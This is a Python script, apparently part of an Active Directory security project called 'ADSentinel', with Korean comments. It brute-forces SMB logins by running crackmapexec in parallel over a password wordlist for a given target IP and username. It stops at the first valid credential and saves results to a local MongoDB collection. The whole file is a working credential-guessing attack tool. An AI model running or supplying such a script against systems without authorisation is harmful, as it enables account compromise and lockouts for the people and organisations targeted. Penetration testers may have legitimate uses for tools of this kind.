#multiprocessing

import subprocess
import sys
from pymongo import MongoClient
from datetime import datetime
from multiprocessing import Pool

def attempt_login(target_ip, username, password):
    """비밀번호를 사용하여 단일 로그인 시도를 수행"""
    result = subprocess.run(
        ["crackmapexec", "smb", target_ip, "-u", username, "-p", password],
        capture_output=True,
        text=True
    )
    if "[+]" in result.stdout:
        return {
            "target_ip": target_ip,
            "username": username,
            "password": password,
            "result": "Success",
            "output": result.stdout,
            "timestamp": datetime.utcnow()
        }  # 성공 시 결과 반환
    return None  # 실패 시 None 반환

def bruteforce_attack(target_ip, username, password_file="/home/hongdan/project/ADSentinel/hd/script/sqlmap.txt"):
    try:
        print("Connecting to MongoDB...")
        client = MongoClient("mongodb://127.0.0.1:27017/")
        db = client["adsentinel_db"]
        exploit_result_collection = db["exploit_result"]

        print(f"Loading passwords from {password_file}...")
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf]
        print(f"Loaded {len(passwords)} passwords.")

        success_message = None

        with Pool(processes=5) as pool:
            results = [pool.apply_async(attempt_login, (target_ip, username, pw)) for pw in passwords]
            for result in results:
                attack_result = result.get()
                if attack_result:
                    success_message = f"Success: {username}:{attack_result['password']}"
                    print(success_message)
                    exploit_result_collection.insert_one(attack_result)  # 성공 결과 MongoDB에 저장
                    print("Result saved to MongoDB.")
                    pool.terminate()  # 성공 시 모든 작업 종료
                    return attack_result  # 성공한 결과 반환

        # 전체 시도가 완료되었으나 성공하지 못한 경우에만 실패 결과를 저장
        if not success_message:
            failure_result = {
                "target_ip": target_ip,
                "username": username,
                "result": "Failure",
                "output": "No valid credentials found.",
                "timestamp": datetime.utcnow()
            }
            print("Bruteforce attack completed. No valid credentials found.")
            exploit_result_collection.insert_one(failure_result)
            print("Failure result saved to MongoDB.")
            return failure_result  # 실패한 결과 반환

    except Exception as e:
        error_message = f"Error occurred: {e}"
        print(error_message)

# CLI 인자로 target_ip와 username을 받음
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python bruteforce.py <target_ip> <username>")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2]

    print(f"Starting bruteforce attack on {target_ip} with username {username}...")
    # Bruteforce 공격 실행
    result = bruteforce_attack(target_ip, username)
    print("Attack completed.")
    print("Final result:", result)

